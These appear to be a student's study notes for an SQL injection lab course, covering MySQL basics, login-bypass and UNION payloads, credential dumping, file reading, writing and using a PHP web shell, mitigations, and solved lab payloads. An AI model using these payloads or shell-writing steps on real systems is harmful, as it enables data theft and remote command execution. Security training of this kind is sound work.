# Introduction

**Tools and Services**

MySQL

**Injection Characters**

```text
'
"
```

```text
https://www.sqlinjection.net/stacked-queries/
https://www.mysqltutorial.org/sql-union-mysql.aspx/
```


# Intro to Databases 

**Tools and Services**

DBMS

**Acronyms and Terms**

```text
DBMS
RDBMS
NoSQL
SQL
API
```

# Types of Databases 

**Tools and Services**

MySQL MongoDB Microsoft Access SQL Server Oracle PostgreSQL

**Table and Column Names (Example Schema)**

```text
users
posts
```

```text
users: id, username, first_name, last_name
posts: id, user_id, date, content
```

**Key-Value NoSQL JSON Structure Example**

```json
{
  "100001": {
    "date": "01-01-2021",
    "content": "Welcome to this web application."
  },
  "100002": {
    "date": "02-01-2021",
    "content": "This is the first post on this web app."
  },
  "100003": {
    "date": "02-01-2021",
    "content": "Reminder: Tomorrow is the ..."
  }
}
```

**NoSQL Storage Models**

```text
Key-Value
Document-Based
Wide-Column
Graph
```

**Key-Value Data Types**

```text
{'key':'value'}
```

# Intro to MySQL 

**Tools and Services**

mysql

**Reference URLs**

```text
https://en.wikipedia.org/wiki/ISO/IEC_9075
https://dev.mysql.com/doc/refman/8.0/en/show-grants.html
https://dev.mysql.com/doc/refman/5.7/en/create-database.html
https://dev.mysql.com/doc/refman/8.0/en/show-databases.html
https://dev.mysql.com/doc/refman/8.0/en/data-types.html
https://dev.mysql.com/doc/refman/8.0/en/creating-tables.html
https://dev.mysql.com/doc/refman/8.0/en/describe.html
https://dev.mysql.com/doc/refman/8.0/en/create-table.html
https://dev.mysql.com/doc/refman/8.0/en/date-and-time-functions.html#function_now
```

**MySQL Login Commands**

```shell
mysql -u root -p
```

```shell
mysql -u root -p<password>
```

```shell
mysql -u root -h docker.hackthebox.eu -P 3306 -p
```

**Database Commands**

```sql
CREATE DATABASE users;
```

```sql
SHOW DATABASES;
```

```sql
USE users;
```

**Table Commands**

```sql
SHOW TABLES;
```

```sql
DESCRIBE logins;
```

**Create Table - Basic**

```sql
CREATE TABLE logins (
    id INT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME
    );
```

**Table Property Snippets**

```sql
id INT NOT NULL AUTO_INCREMENT,
```

```sql
username VARCHAR(100) UNIQUE NOT NULL,
```

```sql
date_of_joining DATETIME DEFAULT NOW(),
```

```sql
PRIMARY KEY (id)
```

**Create Table - Full with Properties**

```sql
CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
    );
```

**MySQL Commands Referenced**

```text
SHOW GRANTS
CREATE DATABASE
SHOW DATABASES
USE
CREATE TABLE
SHOW TABLES
DESCRIBE
```

**Default Port**

```text
3306
```

**Credentials (Lab)**

```text
username: root
password: password
```

---

# SQL Statements 

**Reference URLs**

```text
https://dev.mysql.com/doc/refman/8.0/en/insert.html
https://dev.mysql.com/doc/refman/8.0/en/select.html
https://dev.mysql.com/doc/refman/8.0/en/drop-table.html
https://dev.mysql.com/doc/refman/8.0/en/alter-table.html
https://dev.mysql.com/doc/refman/8.0/en/update.html
```

**INSERT Statements**

```sql
INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);
```

```sql
INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');
```

```sql
INSERT INTO table_name(column2, column3, ...) VALUES (column2_value, column3_value, ...);
```

```sql
INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');
```

```sql
INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');
```

**SELECT Statements**

```sql
SELECT * FROM table_name;
```

```sql
SELECT column1, column2 FROM table_name;
```

```sql
SELECT * FROM logins;
```

```sql
SELECT username,password FROM logins;
```

**DROP Statement**

```sql
DROP TABLE logins;
```

**ALTER Statements**

```sql
ALTER TABLE logins ADD newColumn INT;
```

```sql
ALTER TABLE logins RENAME COLUMN newColumn TO newerColumn;
```

```sql
ALTER TABLE logins MODIFY newerColumn DATE;
```

```sql
ALTER TABLE logins DROP newerColumn;
```

**UPDATE Statement**

```sql
UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;
```

```sql
UPDATE logins SET password = 'change_password' WHERE id > 1;
```

# Query Results 

**ORDER BY Statements**

```sql
SELECT * FROM logins ORDER BY password;
```

```sql
SELECT * FROM logins ORDER BY password DESC;
```

```sql
SELECT * FROM logins ORDER BY password DESC, id ASC;
```

**LIMIT Statements**

```sql
SELECT * FROM logins LIMIT 2;
```

```sql
SELECT * FROM logins LIMIT 1, 2;
```

**WHERE Clause**

```sql
SELECT * FROM table_name WHERE <condition>;
```

```sql
SELECT * FROM logins WHERE id > 1;
```

```sql
SELECT * FROM logins where username = 'admin';
```

**LIKE Clause**

```sql
SELECT * FROM logins WHERE username LIKE 'admin%';
```

```sql
SELECT * FROM logins WHERE username like '___';
```

**LIKE Wildcard Characters**

```text
%
_
```

---

# SQL Operators 

**Reference URLs**

```text
https://dev.mysql.com/doc/refman/8.0/en/logical-operators.html
https://mariadb.com/kb/en/operator-precedence/
```

**AND Operator**

```sql
condition1 AND condition2
```

```sql
SELECT 1 = 1 AND 'test' = 'test';
```

```sql
SELECT 1 = 1 AND 'test' = 'abc';
```

**OR Operator**

```sql
SELECT 1 = 1 OR 'test' = 'abc';
```

```sql
SELECT 1 = 2 OR 'test' = 'abc';
```

**NOT Operator**

```sql
SELECT NOT 1 = 1;
```

```sql
SELECT NOT 1 = 2;
```

**Symbol Operators**

```sql
SELECT 1 = 1 && 'test' = 'abc';
```

```sql
SELECT 1 = 1 || 'test' = 'abc';
```

```sql
SELECT 1 != 1;
```

**Operators in Queries**

```sql
SELECT * FROM logins WHERE username != 'john';
```

```sql
SELECT * FROM logins WHERE username != 'john' AND id > 1;
```

**Operator Precedence Example**

```sql
SELECT * FROM logins WHERE username != 'tom' AND id > 3 - 2;
```

```sql
SELECT * FROM logins WHERE username != 'tom' AND id > 1;
```

**Operator Symbol Equivalents**

```text
AND  ->  &&
OR   ->  ||
NOT  ->  !
```

**Operator Precedence Order (high to low)**

```text
/ * %
+ -
= > < <= >= != LIKE
!
&&
||
```

---


# Intro to SQL Injections 

**PHP Database Connection and Query Code**

```php
$conn = new mysqli("localhost", "root", "password", "users");
$query = "select * from logins";
$result = $conn->query($query);
```

```php
while($row = $result->fetch_assoc() ){
    echo $row["name"]."<br>";
}
```

**PHP Vulnerable User Input Code**

```php
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```

**Resulting Vulnerable SQL Query**

```sql
select * from logins where username like '%$searchInput'
```

**Injection Input Example**

```text
1'; DROP TABLE users;
```

**Injected PHP String Result**

```php
'%1'; DROP TABLE users;'
```

**Final Injected SQL Query**

```sql
select * from logins where username like '%1'; DROP TABLE users;'
```

**Injection Character**

```text
'
```

**SQL Injection Types**

```text
In-band
- Union Based
- Error Based

Blind
- Boolean Based
- Time Based

Out-of-band
```

**Functions Referenced**

```text
Sleep()
```

---

# Subverting Query Logic 

**Reference URLs**

```text
https://payloadallthethings.com
```

**SQLi Discovery Payloads**

```text
'
"
#
;
)
```

**URL Encoded Discovery Payloads**

```text
'  ->  %27
"  ->  %22
#  ->  %23
;  ->  %3B
)  ->  %29
```

**Legitimate Login Query (baseline)**

```sql
SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';
```

**Single Quote Injection - Resulting Broken Query**

```sql
SELECT * FROM logins WHERE username=''' AND password = 'something';
```

**OR Injection Payload - Username Field (known user)**

```sql
admin' or '1'='1
```

**Resulting Query - Known Username**

```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

**OR Injection Payload - Password Field**

```text
something' or '1'='1
```

**Resulting Query - Unknown Username + Password Injection**

```sql
SELECT * FROM logins WHERE username='notAdmin' OR '1'='1' AND password='something' OR '1'='1';
```

**OR Injection Payload - Username Field (no known user)**

```text
' or '1'='1
```

**Resulting Query - Full Bypass No Credentials**

```sql
SELECT * FROM logins WHERE username='' OR '1'='1' AND password='something' OR '1'='1';
```

---

# Using Comments 

**Comment Syntax**

```text
--
-- -
#
/**/
--+
%23
```

**Comment Usage Examples**

```sql
SELECT username FROM logins; -- Selects usernames from the logins table
```

```sql
SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'
```

**Auth Bypass - Username Field with Comment**

```text
admin'--
```

**Resulting Query - Basic Comment Bypass**

```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```

**Auth Bypass - Parenthesis + Comment (broken)**

```text
admin'--
```

**Resulting Broken Query**

```sql
SELECT * FROM logins WHERE (username='admin'--' AND id > 1) AND password='437b930db84b8079c2dd804a71936b5f';
```

**Auth Bypass - Parenthesis + Comment (working)**

```text
admin')--
```

**Resulting Query - Parenthesis Bypass**

```sql
SELECT * FROM logins where (username='admin')
```

---

# Union Clause 

**Reference URLs**

```text
https://dev.mysql.com/doc/refman/8.0/en/union.html
```

**Basic UNION Queries**

```sql
SELECT * FROM ports UNION SELECT * FROM ships;
```

```sql
SELECT city FROM ports UNION SELECT * FROM ships;
```

**UNION Injection - Matching Column Count (2 columns)**

```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```

**UNION Injection - Single Wanted Column with Junk (2 columns)**

```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```

**UNION Injection - Junk Fill (4 columns)**

```sql
UNION SELECT username, 2, 3, 4 from passwords-- '
```

**Junk Fill Values**

```text
1
2
3
4
NULL
"junk"
```

**Tables Referenced**

```text
ports
ships
passwords
products
```

**Columns Referenced**

```text
ports: code, city
ships: Ship, city
passwords: username, password
products: product_id
```

---

# Union Injection 

**Target URL Pattern**

```text
http://SERVER_IP:PORT/search.php?port_code=cn
```

**SQLi Discovery**

```text
http://SERVER_IP:PORT/search.php?port_code=cn'
```

**Column Count Detection - ORDER BY Method**

```sql
' order by 1-- -
```

```sql
' order by 2-- -
```

```sql
' order by 3-- -
```

```sql
' order by 4-- -
```

```sql
' order by 5-- -
```

**URLs - ORDER BY Method**

```text
http://SERVER_IP:PORT/search.php?port_code=' order by 1-- -
http://SERVER_IP:PORT/search.php?port_code=' order by 2-- -
http://SERVER_IP:PORT/search.php?port_code=' order by 5-- -
```

**Column Count Detection - UNION Method**

```sql
cn' UNION select 1,2,3-- -
```

```sql
cn' UNION select 1,2,3,4-- -
```

**URLs - UNION Method**

```text
http://SERVER_IP:PORT/search.php?port_code=cn' UNION select 1,2,3-- -
http://SERVER_IP:PORT/search.php?port_code=cn' UNION select 1,2,3,4-- -
```

**Identify Visible Columns**

```sql
cn' UNION select 1,@@version,3,4-- -
```

**URL - Version Test**

```text
http://SERVER_IP:PORT/search.php?port_code=cn' UNION select 1,@@version,3,4-- -
```

**Variables and Functions Referenced**

```text
@@version
```

---

# Database Enumeration 

**Reference URLs**

```text
https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html
https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html
https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.html
https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html
```

**MySQL Fingerprinting Payloads**

```sql
SELECT @@version
```

```sql
SELECT POW(1,1)
```

```sql
SELECT SLEEP(5)
```

**Fingerprinting via UNION**

```text
http://SERVER_IP:PORT/search.php?port_code=cn' UNION select 1,@@version,3,4-- -
```

**Cross-Database Reference Syntax**

```sql
SELECT * FROM my_database.users;
```

**Enumerate All Databases - Local**

```sql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

**Enumerate All Databases - UNION Injection**

```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

```text
http://SERVER_IP:PORT/search.php?port_code=cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

**Get Current Database**

```sql
cn' UNION select 1,database(),2,3-- -
```

```text
http://SERVER_IP:PORT/search.php?port_code=cn' UNION select 1,database(),2,3-- -
```

**Enumerate Tables in Target Database**

```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

```text
http://SERVER_IP:PORT/search.php?port_code=cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

**Enumerate Columns in Target Table**

```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

```text
http://SERVER_IP:PORT/search.php?port_code=cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

**Dump Target Table Data**

```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

```text
http://SERVER_IP:PORT/search.php?port_code=cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

**INFORMATION_SCHEMA Tables and Columns Used**

```text
INFORMATION_SCHEMA.SCHEMATA        -> SCHEMA_NAME
INFORMATION_SCHEMA.TABLES          -> TABLE_NAME, TABLE_SCHEMA
INFORMATION_SCHEMA.COLUMNS         -> COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA
```

**Target Databases and Tables Identified**

```text
databases: ilfreight, dev
dev tables: credentials, framework, pages, posts
credentials columns: username, password
```

**Functions Referenced**

```text
database()
@@version
POW(1,1)
SLEEP(5)
```

---


# Reading Files 

**Reference URLs**

```text
https://mariadb.com/kb/en/load_file/
```

**Get Current DB User**

```sql
SELECT USER()
```

```sql
SELECT CURRENT_USER()
```

```sql
SELECT user from mysql.user
```

**UNION - Get Current DB User**

```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```

```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

**URLs - Get Current DB User**

```text
http://SERVER_IP:PORT/search.php?port_code=cn' UNION SELECT 1, user(), 3, 4-- -
```

**Check Super Admin Privilege**

```sql
SELECT super_priv FROM mysql.user
```

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

**URLs - Check Super Privilege**

```text
http://SERVER_IP:PORT/search.php?port_code=cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```

**Dump All User Privileges**

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

**URLs - Dump Privileges**

```text
http://SERVER_IP:PORT/search.php?port_code=cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```

**LOAD_FILE - Read /etc/passwd**

```sql
SELECT LOAD_FILE('/etc/passwd');
```

```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

**URLs - Read /etc/passwd**

```text
http://SERVER_IP:PORT/search.php?port_code=cn' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4-- -
```

**LOAD_FILE - Read Web Source Code**

```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

**URLs - Read Source Code**

```text
http://SERVER_IP:PORT/search.php?port_code=cn' UNION SELECT 1, LOAD_FILE('/var/www/html/search.php'), 3, 4-- -
```

**Paths Referenced**

```text
/etc/passwd
/var/www/html/search.php
/var/www/html
```

**Privilege Required**

```text
FILE
```

**Functions Referenced**

```text
USER()
CURRENT_USER()
LOAD_FILE()
```

**Tables Referenced**

```text
mysql.user
information_schema.user_privileges
```

**Columns Referenced**

```text
mysql.user: user, super_priv
information_schema.user_privileges: grantee, privilege_type
```

---

# Writing Files 

**Reference URLs**

```text
https://mariadb.com/kb/en/server-system-variables/#secure_file_priv
https://dev.mysql.com/doc/refman/5.7/en/information-schema-variables-table.html
https://mariadb.com/kb/en/select-into-outfile/
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt
```

**Check secure_file_priv - Direct**

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

**Check secure_file_priv - UNION Injection**

```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

**URL - Check secure_file_priv**

```text
http://SERVER_IP:PORT/search.php?port_code=cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name='secure_file_priv'-- -
```

**SELECT INTO OUTFILE - Basic Examples**

```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

**Write Proof File - Direct SQL**

```sql
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
```

**Write Proof File - UNION Injection**

```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

**URL - Write Proof File**

```text
http://SERVER_IP:PORT/search.php?port_code=cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

**Verify Proof File**

```text
http://SERVER_IP:PORT/proof.txt
```

**PHP Web Shell Payload**

```php
<?php system($_REQUEST[0]); ?>
```

**Write Web Shell - UNION Injection**

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

**URL - Write Web Shell**

```text
http://SERVER_IP:PORT/search.php?port_code=cn' union select " ",'<?php system($_REQUEST[0]); ?>', " ", " " into outfile '/var/www/html/shell.php'-- -
```

**Execute Commands via Web Shell**

```text
http://SERVER_IP:PORT/shell.php?0=id
```

**Advanced Write - Base64 Function**

```text
FROM_BASE64("base64_data")
```

**Server Config File Paths**

```text
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
%WinDir%\System32\Inetsrv\Config\ApplicationHost.config
```

**Output File Paths Used**

```text
/tmp/credentials
/tmp/test.txt
/var/www/html/proof.txt
/var/www/html/shell.php
```

**Tables Referenced**

```text
information_schema.global_variables
```

**Columns Referenced**

```text
variable_name
variable_value
```

**Privileges Required**

```text
FILE
secure_file_priv = empty (not NULL, not a restricted path)
write access to target directory
```

---

# Mitigating SQL Injection 

**Reference URLs**

```text
https://www.php.net/manual/en/mysqli.real-escape-string.php
https://www.php.net/manual/en/function.pg-escape-string.php
https://www.php.net/manual/en/function.preg-match.php
https://www.php.net/manual/en/mysqli-stmt.bind-param.php
```

**Vulnerable PHP Code - Authentication**

```php
<SNIP>
  $username = $_POST['username'];
  $password = $_POST['password'];
  $query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
  echo "Executing query: " . $query . "<br /><br />";
  if (!mysqli_query($conn ,$query))
  {
        die('Error: ' . mysqli_error($conn));
  }
  $result = mysqli_query($conn, $query);
  $row = mysqli_fetch_array($result);
<SNIP>
```

**Input Sanitization - mysqli_real_escape_string()**

```php
<SNIP>
$username = mysqli_real_escape_string($conn, $_POST['username']);
$password = mysqli_real_escape_string($conn, $_POST['password']);
$query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
echo "Executing query: " . $query . "<br /><br />";
<SNIP>
```

**Vulnerable PHP Code - Port Search**

```php
<?php
if (isset($_GET["port_code"])) {
    $q = "Select * from ports where port_code ilike '%" . $_GET["port_code"] . "%'";
    $result = pg_query($conn,$q);
        if (!$result)
    {
        die("</table></div><p style='font-size: 15px;'>" . pg_last_error($conn). "</p>");
    }
<SNIP>
?>
```

**Input Validation - preg_match()**

```php
<SNIP>
$pattern = "/^[A-Za-z\s]+$/";
$code = $_GET["port_code"];
if(!preg_match($pattern, $code)) {
  die("</table></div><p style='font-size: 15px;'>Invalid input! Please try again.</p>");
}
$q = "Select * from ports where port_code ilike '%" . $code . "%'";
<SNIP>
```

**Validation Regex Pattern**

```text
/^[A-Za-z\s]+$/
```

**Test Injection Against Validated Input**

```sql
'; SELECT 1,2,3,4-- -
```

**URL - Test Injection Against Validated Input**

```text
http://SERVER_IP:PORT/search.php?port_code='; SELECT 1,2,3,4-- -
```

**User Privilege Restriction - MariaDB**

```sql
CREATE USER 'reader'@'localhost';
```

```sql
GRANT SELECT ON ilfreight.ports TO 'reader'@'localhost' IDENTIFIED BY 'p@ssw0Rd!!';
```

**Login as Restricted User**

```shell
mysql -u reader -p
```

**Verification Queries as Restricted User**

```sql
use ilfreight;
```

```sql
SHOW TABLES;
```

```sql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

```sql
SELECT * FROM ilfreight.credentials;
```

**Parameterized Queries - PHP**

```php
<SNIP>
  $username = $_POST['username'];
  $password = $_POST['password'];
  $query = "SELECT * FROM logins WHERE username=? AND password = ?" ;
  $stmt = mysqli_prepare($conn, $query);
  mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
  mysqli_stmt_execute($stmt);
  $result = mysqli_stmt_get_result($stmt);
  $row = mysqli_fetch_array($result);
  mysqli_stmt_close($stmt);
<SNIP>
```

**Placeholder Character**

```text
?
```

**WAF Tools Referenced**

```text
ModSecurity
Cloudflare
```

**WAF Blocked String Example**

```text
INFORMATION_SCHEMA
```

**Credentials - Restricted DB User**

```text
username: reader
password: p@ssw0Rd!!
host: localhost
```

---


# New/Different Commands

From the Query Results section:

```sql
SELECT last_name FROM employees WHERE first_name LIKE 'Bar%' AND hire_date = '1990-01-01';
```

From SQL Operators section:

```sql
SELECT emp_no FROM titles WHERE title != '%engineer%' OR emp_no > 10000;
```

From Union Clause section:

```sql
SELECT COUNT(*) AS total
FROM (SELECT * FROM employees
UNION
SELECT dept_no, dept_name, NULL, NULL, NULL, NULL
FROM departments) AS u;
```

```sql
SELECT COUNT(*) 
FROM (
  SELECT emp_no FROM employees
  UNION
  SELECT dept_no FROM departments
) AS u;
```

From Using Comments section:

```text
' OR id = 5)-- 
```

From Union Injection section:

```sql
cn' UNION select 1,user(),3,4-- -
```

From Database Enumeration section (different target database `chattr` instead of `ilfreight`/`dev`):

```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='chattr'-- -
```

```sql
admin')  UNION select 1, 2, database(),4 from INFORMATION_SCHEMA.SCHEMATA #
```

```sql
admin') UNION select 1 , 2 ,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.TABLES where table_schema= 'chattr' #
```

```sql
admin' ) UNION SELECT 1, TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS where table_name='Users'-- -
```

```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='Users'-- -
```

```sql
cn' UNION select 1, username, password, 4 from chattr.Users-- -
```

```sql
admin' )  UNION  select  1 ,  2 , password, username from chattr.Users  #
```

```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- -
```

```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -
```

```sql
cn' UNION select 1, username, password, 4 from ilfreight.users-- -
```

From Intro to MySQL section - live target:

```text
mysql -u root -h 83.136.253.132 -P 38038 -p
```

---

**Summary**

The main differences are lab-specific solved payloads targeting a `chattr` database with a `Users` table, alternate comment-style payloads using `#` instead of `-- -`, the `admin')` parenthesis bypass pattern applied to enumeration queries, and a few exercise queries from the SQL fundamentals sections (`employees`, `titles`, `departments` tables). These appear to be your solved question answers and practice queries from the interactive lab exercises.



# SA

username=man&password=M%4012345678&repeatPassword=M%4012345678&invitationCode=mann-manr-9999' OR '1'='1


admin') UNION SELECT 1,2,database(),4-- -

admin') UNION SELECT 1,2,TABLE_NAME,4 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='chattr'-- -


admin') UNION SELECT 1,2,COLUMN_NAME,4 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='Users'-- -

admin') UNION SELECT 1,2,Password,4 FROM chattr.Users WHERE Username='admin'-- -


admin') UNION SELECT 1,2,user(),4-- -

admin') UNION SELECT 1,2,privilege_type,4 FROM information_schema.user_privileges-- -

admin') UNION SELECT 1,2,variable_value,4 FROM information_schema.global_variables WHERE variable_name='secure_file_priv'-- -
admin') UNION SELECT 1,2,LOAD_FILE('/etc/nginx/sites-enabled/default'),4-- -

admin') UNION SELECT "",'<?php system($_REQUEST["cmd"]); ?>',"","" INTO OUTFILE '/var/www/chattr-prod/shell.php'-- -

https://154.57.164.81:30423/shelll.php?cmd=cat /flag_xxxxx.txt